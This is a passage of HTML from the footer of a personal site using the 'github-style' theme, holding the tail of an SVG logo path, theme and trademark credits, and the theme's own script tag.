3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a><ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"><li class="mr-3 mr-lg-0">Theme by <a href=https://github.com/MeiK2333/github-style>github-style</a></li><li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href=https://github.com/>GitHub, Inc.</a></li></ul></div><div class="d-flex flex-justify-center pb-6"><span class="f6 text-gray-light"></span></div></div></body><script type=application/javascript src=https://lyccyc.github.io/js/github-style.js></script></html>
